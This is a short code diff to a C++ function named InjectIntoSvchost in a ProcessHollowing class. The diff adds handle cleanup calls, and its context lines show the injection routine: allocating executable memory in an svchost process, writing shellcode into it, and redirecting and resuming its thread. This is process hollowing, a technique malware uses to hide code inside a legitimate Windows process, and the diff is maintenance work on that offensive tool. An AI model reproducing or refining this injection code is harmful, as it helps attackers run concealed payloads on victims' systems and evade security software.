@@ -20,6 +20,8 @@ bool ProcessHollowing::InjectIntoSvchost(const void* shellcode, size_t size) {
     void* remoteMem = VirtualAllocEx(pi.hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if(!remoteMem) {
         TerminateProcess(pi.hProcess, 0);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
         return false;
     }
 
@@ -27,6 +29,8 @@ bool ProcessHollowing::InjectIntoSvchost(const void* shellcode, size_t size) {
     SIZE_T bytesWritten;
     if(!WriteProcessMemory(pi.hProcess, remoteMem, shellcode, size, &bytesWritten)) {
         TerminateProcess(pi.hProcess, 0);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
         return false;
     }
 
@@ -41,9 +45,15 @@ bool ProcessHollowing::InjectIntoSvchost(const void* shellcode, size_t size) {
 #endif
         SetThreadContext(pi.hThread, &ctx);
         ResumeThread(pi.hThread);
+        
+        // BUG FIXED: Handles must be closed even after successful injection
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
         return true;
     }
     
     TerminateProcess(pi.hProcess, 0);
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
     return false;
 }
